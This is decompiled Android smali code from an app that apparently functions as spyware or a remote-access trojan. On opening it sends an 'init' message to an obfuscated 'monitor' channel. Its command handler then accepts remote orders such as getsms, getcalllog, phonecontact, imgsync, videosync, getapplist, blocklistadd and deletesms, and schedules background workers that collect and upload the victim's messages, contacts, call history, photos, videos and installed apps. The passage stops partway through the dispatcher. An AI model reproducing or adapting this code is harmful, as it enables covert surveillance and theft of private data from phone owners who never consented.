.class public Li/a/a/r$b;
.super Lq/d/a/c;
.source "sourcefile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Li/a/a/r;->b(Ljava/lang/String;)Li/a/a/r;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = null
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 137
    invoke-direct {p0}, Lq/d/a/c;-><init>()V

    return-void
.end method

.method public static synthetic g(Ljava/lang/Long;)V
    .locals 8
    .param p0, "aLong"    # Ljava/lang/Long;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/lang/Throwable;
        }
    .end annotation

    .line 189
    invoke-static {}, Li/a/a/r;->c()Lq/d/a/a;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v7

    const-string v1, "monitor.b2d28d1446e434f9eb865348991a573882414960f8f884033af1fc2396d9d2ff"

    const-string v2, "url"

    const/4 v3, 0x0

    const/4 v4, 0x0

    move-object v5, v6

    invoke-virtual/range {v0 .. v7}, Lq/d/a/a;->g(Ljava/lang/String;Ljava/lang/String;[B[BLjava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)V

    .line 190
    return-void
.end method


# virtual methods
.method public a()V
    .locals 0

    .line 441
    return-void
.end method

.method public b()V
    .locals 0

    .line 431
    return-void
.end method

.method public c()V
    .locals 0

    .line 426
    return-void
.end method

.method public d()V
    .locals 12
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "CheckResult",
            "MissingPermission"
        }
    .end annotation

    .line 141
    const-string v0, "init"

    const-string v1, "MainActivity"

    const-string v2, "onOpen:"

    invoke-static {v1, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 145
    :try_start_0
    const-string v1, "eee"

    sget-object v2, Li/a/a/p;->d:Ljava/lang/String;

    invoke-static {v1, v2}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 147
    invoke-static {}, Li/a/a/r;->r()Lorg/json/JSONObject;

    move-result-object v1

    .line 148
    .local v1, "obj":Lorg/json/JSONObject;
    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 149
    .local v2, "robj":Lorg/json/JSONObject;
    const-string v3, "method"

    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 150
    const-string v3, "data"

    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 152
    invoke-static {}, Li/a/a/r;->c()Lq/d/a/a;

    move-result-object v4

    const-string v5, "monitor.b2d28d1446e434f9eb865348991a573882414960f8f884033af1fc2396d9d2ff"

    invoke-virtual {v2}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v9

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v10

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v11

    invoke-virtual/range {v4 .. v11}, Lq/d/a/a;->g(Ljava/lang/String;Ljava/lang/String;[B[BLjava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;)V

    .line 154
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    if-eqz v3, :cond_0

    .line 155
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v3

    invoke-virtual {v3, v0}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 157
    :cond_0
    new-instance v3, Ld/a0/e$a;

    invoke-direct {v3}, Ld/a0/e$a;-><init>()V

    const-string v4, "event"

    .line 158
    invoke-virtual {v3, v4, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 159
    invoke-virtual {v3}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v3

    .line 160
    .local v3, "inputData":Ld/a0/e;
    new-instance v4, Ld/a0/n$a;

    const-class v5, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    invoke-direct {v4, v5}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 161
    invoke-virtual {v4, v3}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v4, Ld/a0/n$a;

    .line 162
    invoke-virtual {v4, v0}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v4, Ld/a0/n$a;

    .line 163
    invoke-virtual {v4}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v0

    check-cast v0, Ld/a0/n;

    .line 164
    .local v0, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v4}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v4

    invoke-virtual {v4, v0}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 176
    nop

    .end local v0    # "oneTimeWorkRequest":Ld/a0/n;
    .end local v1    # "obj":Lorg/json/JSONObject;
    .end local v2    # "robj":Lorg/json/JSONObject;
    .end local v3    # "inputData":Ld/a0/e;
    goto :goto_0

    .line 170
    :catch_0
    move-exception v0

    .line 175
    .local v0, "e":Ljava/lang/Exception;
    invoke-static {v0}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "error"

    invoke-static {v2, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 177
    .end local v0    # "e":Ljava/lang/Exception;
    :goto_0
    const-wide/16 v0, 0x1e

    sget-object v2, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-static {v0, v1, v2}, Lj/a/h0/b/d;->d(JLjava/util/concurrent/TimeUnit;)Lj/a/h0/b/d;

    move-result-object v0

    .line 180
    invoke-static {}, Lj/a/h0/i/a;->b()Lj/a/h0/b/g;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/a/h0/b/d;->k(Lj/a/h0/b/g;)Lj/a/h0/b/d;

    move-result-object v0

    .line 183
    invoke-static {}, Lj/a/h0/a/b/b;->d()Lj/a/h0/b/g;

    move-result-object v1

    invoke-virtual {v0, v1}, Lj/a/h0/b/d;->e(Lj/a/h0/b/g;)Lj/a/h0/b/d;

    move-result-object v0

    sget-object v1, Li/a/a/b;->a:Li/a/a/b;

    .line 186
    invoke-virtual {v0, v1}, Lj/a/h0/b/d;->g(Lj/a/h0/e/c;)Lj/a/h0/c/c;

    .line 192
    return-void
.end method

.method public e(Ljava/lang/Throwable;)V
    .locals 0
    .param p1, "throwable"    # Ljava/lang/Throwable;

    .line 436
    return-void
.end method

.method public f(Ljava/lang/String;Ljava/lang/String;[BIZ)Ljava/lang/Object;
    .locals 16
    .param p1, "s"    # Ljava/lang/String;
    .param p2, "s1"    # Ljava/lang/String;
    .param p3, "bytes"    # [B
    .param p4, "i"    # I
    .param p5, "b"    # Z

    .line 198
    const-string v0, "shell"

    const-string v1, "blocklist"

    const-string v2, "status"

    const-string v3, "batteryopt"

    const-string v4, "pingtime"

    const-string v5, "applist"

    const-string v6, "videosync"

    const-string v7, "imgsync"

    const-string v8, "getsms"

    const-class v9, Lgqegwqg/bbebebefff/asdcdsac/worker/InitWorker;

    const/4 v10, 0x0

    .line 202
    .local v10, "body":Lorg/json/JSONObject;
    :try_start_0
    new-instance v11, Lorg/json/JSONObject;

    move-object/from16 v12, p2

    invoke-direct {v11, v12}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    move-object v10, v11

    .line 203
    const-string v11, "method"

    invoke-virtual {v10, v11}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 204
    .local v11, "event":Ljava/lang/String;
    const-string v13, "ping"

    invoke-static {v11, v13}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v13

    if-eqz v13, :cond_0

    .line 205
    const-string v0, "pongtime"

    invoke-virtual {v10, v4}, Lorg/json/JSONObject;->getLong(Ljava/lang/String;)J

    move-result-wide v1

    invoke-virtual {v10, v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;J)Lorg/json/JSONObject;

    .line 206
    invoke-virtual {v10, v4}, Lorg/json/JSONObject;->remove(Ljava/lang/String;)Ljava/lang/Object;

    .line 208
    const-string v0, "myLgegffefefog"

    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 209
    invoke-virtual {v10}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v0

    return-object v0

    .line 210
    :cond_0
    const-string v4, "phonecontact"

    invoke-static {v11, v4}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v13, "event"

    const-string v14, "type"

    const-string v15, "ok"

    if-eqz v4, :cond_2

    .line 211
    :try_start_1
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_1
    .catch Lorg/json/JSONException; {:try_start_1 .. :try_end_1} :catch_0

    const-string v1, "contactlist"

    if-eqz v0, :cond_1

    .line 212
    :try_start_2
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v1}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 214
    :cond_1
    invoke-virtual {v10, v14}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 216
    .local v0, "type":Ljava/lang/String;
    new-instance v2, Ld/a0/e$a;

    invoke-direct {v2}, Ld/a0/e$a;-><init>()V

    .line 217
    invoke-virtual {v2, v13, v1}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 218
    invoke-virtual {v2, v14, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 219
    invoke-virtual {v2}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v2

    .line 221
    .local v2, "inputData":Ld/a0/e;
    new-instance v3, Ld/a0/n$a;

    invoke-direct {v3, v9}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 222
    invoke-virtual {v3, v2}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v3, Ld/a0/n$a;

    .line 223
    invoke-virtual {v3, v1}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v3, Ld/a0/n$a;

    .line 224
    invoke-virtual {v3}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v1

    check-cast v1, Ld/a0/n;

    .line 227
    .local v1, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v3

    invoke-static {v3}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v3

    invoke-virtual {v3, v1}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 228
    return-object v15

    .line 229
    .end local v0    # "type":Ljava/lang/String;
    .end local v1    # "oneTimeWorkRequest":Ld/a0/n;
    .end local v2    # "inputData":Ld/a0/e;
    :cond_2
    invoke-static {v11, v3}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4

    const/4 v12, 0x0

    if-eqz v4, :cond_3

    .line 230
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v0

    invoke-virtual {v0}, Li/a/a/r;->e()Ljava/lang/String;

    goto/16 :goto_1

    .line 231
    :cond_3
    invoke-static {v11, v2}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    .line 232
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 234
    .local v0, "objv":Lorg/json/JSONObject;
    invoke-virtual {v0, v13, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 235
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v1

    invoke-virtual {v1}, Li/a/a/r;->e()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 236
    const-string v1, "notification"

    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v2

    invoke-virtual {v2}, Li/a/a/r;->s()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 237
    const-string v1, "getDefaultSms"

    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v2

    invoke-virtual {v2}, Li/a/a/r;->l()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 238
    const-string v1, "battery"

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Li/a/a/r$i;->a(Landroid/content/Context;)I

    move-result v2

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 240
    return-object v15

    .line 241
    .end local v0    # "objv":Lorg/json/JSONObject;
    :cond_4
    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v2
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_0

    const-string v3, "data"

    if-eqz v2, :cond_5

    .line 243
    :try_start_3
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    .line 246
    .restart local v0    # "objv":Lorg/json/JSONObject;
    invoke-virtual {v0, v13, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 247
    invoke-static {}, Li/a/a/r;->f()Lorg/json/JSONArray;

    move-result-object v1

    invoke-virtual {v1}, Lorg/json/JSONArray;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 249
    return-object v15

    .line 251
    .end local v0    # "objv":Lorg/json/JSONObject;
    :cond_5
    const-string v1, "blocklistadd"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1
    :try_end_3
    .catch Lorg/json/JSONException; {:try_start_3 .. :try_end_3} :catch_0

    const-string v2, "number"

    if-eqz v1, :cond_6

    .line 252
    :try_start_4
    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 253
    .local v0, "num":Ljava/lang/String;
    invoke-static {v0}, Li/a/a/r;->g(Ljava/lang/String;)V

    .line 255
    return-object v15

    .line 256
    .end local v0    # "num":Ljava/lang/String;
    :cond_6
    invoke-static {v11, v8}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_7

    .line 258
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v8}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 259
    invoke-virtual {v10, v14}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 261
    .local v0, "type":Ljava/lang/String;
    new-instance v1, Ld/a0/e$a;

    invoke-direct {v1}, Ld/a0/e$a;-><init>()V

    .line 262
    invoke-virtual {v1, v13, v8}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 263
    invoke-virtual {v1, v14, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 264
    invoke-virtual {v1}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v1

    .line 266
    .local v1, "inputData":Ld/a0/e;
    new-instance v2, Ld/a0/n$a;

    invoke-direct {v2, v9}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 267
    invoke-virtual {v2, v1}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 268
    invoke-virtual {v2, v8}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 269
    invoke-virtual {v2}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v2

    check-cast v2, Ld/a0/n;

    .line 272
    .local v2, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v3

    invoke-static {v3}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v3

    invoke-virtual {v3, v2}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 273
    return-object v15

    .line 274
    .end local v0    # "type":Ljava/lang/String;
    .end local v1    # "inputData":Ld/a0/e;
    .end local v2    # "oneTimeWorkRequest":Ld/a0/n;
    :cond_7
    const-string v1, "blocklistupdate"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_8

    .line 275
    invoke-virtual {v10, v2}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 276
    .local v0, "num":Ljava/lang/String;
    invoke-static {v0}, Li/a/a/r;->h(Ljava/lang/String;)V

    .line 277
    return-object v15

    .line 278
    .end local v0    # "num":Ljava/lang/String;
    :cond_8
    const-string v1, "getcalllog"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_a

    .line 279
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0
    :try_end_4
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_0

    const-string v1, "calllog"

    if-eqz v0, :cond_9

    .line 280
    :try_start_5
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v1}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 282
    :cond_9
    invoke-virtual {v10, v14}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 284
    .local v0, "type":Ljava/lang/String;
    new-instance v2, Ld/a0/e$a;

    invoke-direct {v2}, Ld/a0/e$a;-><init>()V

    .line 285
    invoke-virtual {v2, v13, v1}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 286
    invoke-virtual {v2, v14, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 287
    invoke-virtual {v2}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v2

    .line 290
    .local v2, "inputData":Ld/a0/e;
    new-instance v3, Ld/a0/n$a;

    invoke-direct {v3, v9}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 291
    invoke-virtual {v3, v2}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v3, Ld/a0/n$a;

    .line 292
    invoke-virtual {v3, v1}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v3, Ld/a0/n$a;

    .line 293
    invoke-virtual {v3}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v1

    check-cast v1, Ld/a0/n;

    .line 296
    .local v1, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v3

    invoke-static {v3}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v3

    invoke-virtual {v3, v1}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 297
    return-object v15

    .line 298
    .end local v0    # "type":Ljava/lang/String;
    .end local v1    # "oneTimeWorkRequest":Ld/a0/n;
    .end local v2    # "inputData":Ld/a0/e;
    :cond_a
    invoke-static {v11, v7}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_c

    .line 299
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_b

    .line 300
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v7}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 302
    :cond_b
    invoke-virtual {v10, v14}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 304
    .restart local v0    # "type":Ljava/lang/String;
    new-instance v1, Ld/a0/e$a;

    invoke-direct {v1}, Ld/a0/e$a;-><init>()V

    .line 305
    invoke-virtual {v1, v13, v7}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 306
    invoke-virtual {v1, v14, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 307
    invoke-virtual {v1}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v1

    .line 310
    .local v1, "inputData":Ld/a0/e;
    new-instance v2, Ld/a0/n$a;

    invoke-direct {v2, v9}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 311
    invoke-virtual {v2, v1}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 312
    invoke-virtual {v2, v7}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 313
    invoke-virtual {v2}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v2

    check-cast v2, Ld/a0/n;

    .line 316
    .local v2, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v3

    invoke-static {v3}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v3

    invoke-virtual {v3, v2}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 317
    return-object v15

    .line 318
    .end local v0    # "type":Ljava/lang/String;
    .end local v1    # "inputData":Ld/a0/e;
    .end local v2    # "oneTimeWorkRequest":Ld/a0/n;
    :cond_c
    invoke-static {v11, v6}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_e

    .line 319
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_d

    .line 320
    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v6}, Ld/a0/t;->b(Ljava/lang/String;)Ld/a0/o;

    .line 322
    :cond_d
    invoke-virtual {v10, v14}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 324
    .restart local v0    # "type":Ljava/lang/String;
    new-instance v1, Ld/a0/e$a;

    invoke-direct {v1}, Ld/a0/e$a;-><init>()V

    .line 325
    invoke-virtual {v1, v13, v6}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 326
    invoke-virtual {v1, v14, v0}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 327
    invoke-virtual {v1}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v1

    .line 330
    .restart local v1    # "inputData":Ld/a0/e;
    new-instance v2, Ld/a0/n$a;

    invoke-direct {v2, v9}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 331
    invoke-virtual {v2, v1}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 332
    invoke-virtual {v2, v6}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v2, Ld/a0/n$a;

    .line 333
    invoke-virtual {v2}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v2

    check-cast v2, Ld/a0/n;

    .line 336
    .restart local v2    # "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v3

    invoke-static {v3}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v3

    invoke-virtual {v3, v2}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 337
    return-object v15

    .line 338
    .end local v0    # "type":Ljava/lang/String;
    .end local v1    # "inputData":Ld/a0/e;
    .end local v2    # "oneTimeWorkRequest":Ld/a0/n;
    :cond_e
    const-string v1, "getapplist"

    invoke-static {v11, v1}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_f

    .line 339
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v0

    invoke-static {v0}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v0

    invoke-virtual {v0, v5}, Ld/a0/t;->a(Ljava/lang/String;)Ld/a0/o;

    .line 340
    new-instance v0, Ld/a0/e$a;

    invoke-direct {v0}, Ld/a0/e$a;-><init>()V

    .line 341
    invoke-virtual {v0, v13, v5}, Ld/a0/e$a;->e(Ljava/lang/String;Ljava/lang/String;)Ld/a0/e$a;

    .line 342
    invoke-virtual {v0}, Ld/a0/e$a;->a()Ld/a0/e;

    move-result-object v0

    .line 345
    .local v0, "inputData":Ld/a0/e;
    new-instance v1, Ld/a0/n$a;

    invoke-direct {v1, v9}, Ld/a0/n$a;-><init>(Ljava/lang/Class;)V

    .line 346
    invoke-virtual {v1, v0}, Ld/a0/u$a;->e(Ld/a0/e;)Ld/a0/u$a;

    check-cast v1, Ld/a0/n$a;

    .line 347
    invoke-virtual {v1, v5}, Ld/a0/u$a;->a(Ljava/lang/String;)Ld/a0/u$a;

    check-cast v1, Ld/a0/n$a;

    .line 348
    invoke-virtual {v1}, Ld/a0/u$a;->b()Ld/a0/u;

    move-result-object v1

    check-cast v1, Ld/a0/n;

    .line 351
    .local v1, "oneTimeWorkRequest":Ld/a0/n;
    invoke-static {}, Li/a/a/r;->m()Li/a/a/r;

    move-result-object v2

    invoke-static {v2}, Li/a/a/r;->d(Li/a/a/r;)Landroid/content/Context;

    move-result-object v2

    invoke-static {v2}, Ld/a0/t;->e(Landroid/content/Context;)Ld/a0/t;

    move-result-object v2

    invoke-virtual {v2, v1}, Ld/a0/t;->c(Ld/a0/u;)Ld/a0/o;

    .line 352
    return-object v15

    .line 353
    .end local v0    # "inputData":Ld/a0/e;
    .end local v1    # "oneTimeWorkRequest":Ld/a0/n;
    :cond_f
    const-string v1, "deletesms"

